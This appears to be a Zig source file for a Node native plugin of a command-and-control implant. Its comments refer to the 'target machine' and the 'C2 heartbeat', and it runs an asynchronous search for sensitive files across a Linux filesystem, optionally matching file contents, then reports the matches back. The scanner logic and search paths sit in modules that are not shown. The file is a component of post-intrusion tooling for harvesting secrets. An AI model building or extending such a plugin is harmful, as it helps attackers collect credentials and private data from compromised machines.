const std = @import("std");
const tokota = @import("tokota");
const types = @import("types.zig");
const builtin = @import("builtin");

const is_linux = builtin.os.tag == .linux;

const scanner = if (is_linux) @import("scanner.zig") else struct {
    pub fn scan(
        _: []const u8,
        _: []u8,
        _: *usize,
        _: *usize,
        _: *usize,
        _: *usize,
        _: *usize,
        _: *bool,
        _: bool,
    ) bool {
        return false;
    }
};

comptime {
    tokota.exportModule(@This());
}

/// 单次扫描任务：tokota asyncTask 执行器。v0.15.0 起扫描在 libuv worker
/// 线程执行，不再冻结目标机 Node 主线程（v0.14.3 及以前全同步，扫描期间
/// C2 心跳停摆、其他任务排队；content 模式碰上命名管道还会永久挂死）。
const ScanTask = struct {
    /// 输出缓冲（堆分配；resolve 是复制语义，cleanUp 负责释放）
    buf: []u8,
    len: usize = 0,
    truncated: bool = false,
    search_content: bool,
    total_scanned: usize = 0,
    matches_found: usize = 0,
    reported: usize = 0,
    errors_count: usize = 0,
    elapsed_ms: i64 = 0,
    task: tokota.async.Task(*@This()) = undefined,

    /// JS 线程：分配缓冲与任务，投递到 worker 线程池
    fn schedule(env: tokota.Env, search_content: bool) !tokota.Promise {
        const allocator = std.heap.c_allocator;
        const buf = try allocator.alloc(u8, types.output_buf_size);
        errdefer allocator.free(buf);
        const self = try allocator.create(ScanTask);
        errdefer allocator.destroy(self);
        self.* = .{ .buf = buf, .search_content = search_content };
        return env.asyncTask(self, &self.task);
    }

    /// worker 线程：执行扫描。所有错误内部消化进计数器，恒正常返回——
    /// asyncTask 的 execute 不得返回 error（包装层会在 worker 线程调
    /// napi_throw，违反 N-API 线程契约）。
    pub fn execute(self: *ScanTask) void {
        types.log(self.buf, &self.len, &self.truncated, "[INFO] Platform: {s}\n", .{@tagName(builtin.os.tag)});

        if (!is_linux) {
            types.log(self.buf, &self.len, &self.truncated, "[ERRO] This plugin only works on Linux systems\n", .{});
            return;
        }

        types.log(self.buf, &self.len, &self.truncated, "[INFO] Scanning: /\n", .{});
        if (self.search_content) {
            types.log(self.buf, &self.len, &self.truncated, "[INFO] Content scan: enabled\n", .{});
        } else {
            types.log(self.buf, &self.len, &self.truncated, "[INFO] Content scan: disabled\n", .{});
        }
        types.log(self.buf, &self.len, &self.truncated, "[DEBU] Max depth: {}\n", .{types.max_depth});

        const CLOCK_MONOTONIC: std.c.clockid_t = @as(std.os.linux.clockid_t, .MONOTONIC);
        var ts: std.c.timespec = undefined;
        _ = std.c.clock_gettime(CLOCK_MONOTONIC, &ts);
        const start_ns = @as(i128, ts.sec) * 1_000_000_000 + ts.nsec;

        for (&types.search_paths) |base_path| {
            _ = scanner.scan(base_path, self.buf, &self.len, &self.total_scanned, &self.matches_found, &self.reported, &self.errors_count, &self.truncated, self.search_content);
        }

        _ = std.c.clock_gettime(CLOCK_MONOTONIC, &ts);
        const elapsed_ns = (@as(i128, ts.sec) * 1_000_000_000 + ts.nsec) - start_ns;
        self.elapsed_ms = @as(i64, @intCast(@divTrunc(elapsed_ns, 1_000_000)));
    }

    /// JS 线程：收尾统计行与截断标记，返回完整输出。
    /// deferred.resolve 会把字节复制进 V8 堆，复制完成后 cleanUp 才释放原缓冲。
    pub fn complete(self: *ScanTask, env: tokota.Env) ![]const u8 {
        _ = env;
        types.log(self.buf, &self.len, &self.truncated, "\n[INFO] Total scanned: {} files\n", .{self.total_scanned});
        types.log(self.buf, &self.len, &self.truncated, "[INFO] Matches found: {}\n", .{self.matches_found});
        types.log(self.buf, &self.len, &self.truncated, "[INFO] Elapsed: {} ms\n", .{self.elapsed_ms});

        if (self.errors_count > 0) {
            types.log(self.buf, &self.len, &self.truncated, "[WARN] Errors encountered: {}\n", .{self.errors_count});
        }

        // 尾部保留区保证这行总有容身之处
        if (self.truncated) {
            types.writeTruncationMarker(self.buf, &self.len);
        }

        return self.buf[0..self.len];
    }

    /// JS 线程：resolve/reject 之后释放缓冲与任务本体（一次分配、一次销毁）
    pub fn cleanUp(self: *ScanTask, env: tokota.Env) !void {
        _ = env;
        const allocator = std.heap.c_allocator;
        allocator.free(self.buf);
        allocator.destroy(self);
    }
};

/// 异步敏感文件搜索：返回 Promise，输出字符串按 [LEVEL] 行前缀契约。
/// 参数解析保持在 JS 线程（与 v0.14.3 语义一致）。
pub fn search(call: tokota.Call) !tokota.Promise {
    const search_content = if (try call.argCount() > 0) blk: {
        const args = try call.args(1);
        if (try args[0].isNullOrUndefined(call.env)) break :blk false;
        const obj: tokota.Object = .{ .ptr = args[0], .env = call.env };
        const val = obj.get("search_content") catch break :blk false;
        if (try val.isNullOrUndefined(call.env)) break :blk false;
        break :blk val.boolean(call.env) catch false;
    } else false;

    return ScanTask.schedule(call.env, search_content);
}
